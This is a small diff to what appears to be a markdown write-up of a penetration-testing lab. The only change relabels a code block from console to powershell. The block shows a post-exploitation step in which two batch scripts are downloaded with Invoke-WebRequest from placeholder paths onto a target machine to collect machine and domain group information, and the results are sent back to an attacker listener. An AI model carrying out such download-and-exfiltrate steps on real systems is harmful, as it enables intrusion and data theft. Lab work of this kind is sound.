@@ -27,7 +27,7 @@ Target machine
 Post-exploitation
 Download 2 scripts to discovery local machine and domain group info, then send them back to attacker listener. 
 
-'''console
+'''powershell
 <Invoke-WebRequest -Uri path/to/discovery.bat -o discovery.bat>
 <Invoke-WebRequest -Uri path/to/export.bat -o export.bat>
 '''
